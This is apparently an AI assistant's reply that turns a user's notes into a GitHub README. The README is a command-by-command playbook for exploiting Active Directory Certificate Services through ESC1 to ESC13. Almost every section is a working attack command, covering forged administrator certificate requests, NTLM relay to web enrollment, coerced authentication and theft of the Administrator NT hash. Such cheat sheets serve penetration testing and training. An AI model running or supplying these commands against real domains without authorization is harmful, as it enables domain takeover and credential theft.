Here’s a sample README file for your GitHub project. You can copy and modify it based on your specific needs:

```markdown
# Active Directory Certificate Services (ADCS) Enumeration and Exploitation

This repository provides a comprehensive guide for enumerating and exploiting vulnerabilities in Active Directory Certificate Services (ADCS), leveraging tools such as Certipy, Certify, and CertExe. It covers a wide range of attacks and techniques, from finding vulnerable certificate templates to escalating privileges and authenticating with compromised certificates.

## Tools and Commands

### Enumeration
- **NetExec**
  - Find PKI Enrollment Services in Active Directory and Certificate Templates Names
  ```bash
  nxc ldap ip -u username -p password -M adcs
  ```

- **Certipy**
  - Search for vulnerable certificate templates
  ```bash
  certipy find -u username -p password -dc-ip ip -target dc -enabled -vulnerable -stdout
  ```

  - List CAs, servers, and search for vulnerable certificate templates
  ```bash
  certipy find -u username -p password -dc-ip ip -dns-tcp -ns ip -debug
  ```

- **Certify**
  - Search for vulnerable certificate templates
  ```bash
  Certify.exe find /vulnerable
  ```

### Attacks

#### ESC1: Create a New Machine Account
```bash
addcomputer.py domain/username:password -computer-name computer_name -computer-pass computer_password
```

- Use the ability to enroll as a normal user & provide a user-defined Subject Alternative Name (SAN)
  ```bash
  certipy req -u computer_name -p computer_password -ca ca -target domain -template template -upn administrator -dc-ip ip
  ```
  Or
  ```bash
  certipy req -u username -p password -ca ca -target domain -template template -upn administrator -dc-ip ip
  ```

- If you run Certipy and see Minimum RSA Key Length: 4096, provide `-key-size 4096` to Certipy:
  ```bash
  certipy req -u username -p password -ca ca -target domain -template template -upn administrator -dc-ip ip -key-size 4096
  ```

- Authenticate with the certificate and get the NT hash of the Administrator:
  ```bash
  certipy auth -pfx administrator.pfx -domain domain -username username -dc-ip ip
  ```

#### ESC3: Request a Certificate
```bash
certipy req -username username -password password -ca ca -target domain -template template
```

- Request a certificate on behalf of another user:
  ```bash
  certipy req username -password password -ca ca -target domain -template User -on-behalf-of 'domain\administrator' -pfx pfx_file
  ```

- Authenticate as Administrator:
  ```bash
  certipy auth -pfx administrator.pfx -dc-ip ip
  ```

#### ESC4: Overwrite Configuration to Make It Vulnerable to ESC1
```bash
certipy template -username username -password password -template template -save-old -dc-ip ip
certipy req -u username -p password -dc-ip ip -ca ca -target dc -template template -upn administrator@domain
certipy auth -pfx administrator.pfx -domain domain -username administrator -dc-ip ip
```

#### ESC6
```bash
certipy req -username administrator@domain -password password -ca ca -target domain -template template -upn administrator@domain
```

#### ESC7: Enable SubCA Template on the CA
1. Grant Manage Certificates access right:
   ```bash
   certipy ca -ca ca -add-officer username -username username@domain -password password -dc-ip ip -dns-tcp -ns ip
   ```

2. Enable the SubCA template:
   ```bash
   certipy ca -ca ca -enable-template SubCA -username username@domain -password password -dc-ip ip -dns-tcp -ns ip
   ```

3. Issue the failed certificate request:
   ```bash
   certipy ca -ca ca -issue-request request_ID -username username@domain -password password
   ```

4. Retrieve the issued certificate:
   ```bash
   certipy req -username username@domain -password password -ca ca -target ip -retrieve request_ID
   ```

5. Authenticate with the certificate and get the NT hash of the Administrator:
   ```bash
   certipy auth -pfx pfx_file -domain domain -username username -dc-ip ip
   ```

#### ESC8: Exploit ADCS Server with Web Enrollment
```bash
ntlmrelayx.py -t http://domain/certsrv/certfnsh.asp -smb2support --adcs --template template --no-http-server --no-wcf-server --no-raw-server
coercer coerce -u username -p password -l ws_ip -t dc_ip --always-continue
certipy auth -pfx administrator.pfx
```

#### ESC9: Exploit ESC9 with Certipy Shadow
```bash
certipy shadow auto -username username@domain -hashes :hash -account target_username
certipy account update -username username@domain -hashes :hash -user target_username -upn administrator
certipy req -username target_username@domain -hashes :target_hash -ca ca -template template -target $DC_IP
certipy account update -username username@domain -hashes :hash -user target_username -upn administrator
certipy auth -pfx administrator.pfx -domain domain
```

#### ESC13: Advanced Certificate Requests
```bash
certipy req -u username -p password -ca ca -target domain -template template -dc-ip ip -key-size 4096
python3 gettgtpkinit.py -cert-pfx pfx_file domain/username ccache_file -dc-ip ip -v
```

## Resources

- [ADCS Abuse - PPN](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ad-cs-abuse)
- [Hacktricks - ADCS Enumeration](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation)
- [SwisskyRepo - ADCS Certificate Services](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adcs-certificate-services/#adcs-enumeration)
- [Vulndev.io - ADCS Walkthrough](https://vulndev.io/2023/07/01/vl-intercept-walkthrough/)
- [Logan Goins - ADCS Attack](https://logan-goins.com/2024-05-04-ADCS/)
- [Bulletproof - ADCS ESC7 Attack](https://www.tarlogic.com/blog/ad-cs-esc7-attack/)
- [Black Hills InfoSec - ADCS Exploits](https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/)
- [More Articles on ADCS Exploitation](https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-2/)

## Tools

- [Certipy](https://github.com/ly4k/Certipy)
- [Certify](https://github.com/GhostPack/Certify)
```

This README file covers all the content you provided. You can simply paste it into a `README.md` file on your GitHub project. Let me know if you need any further adjustments!
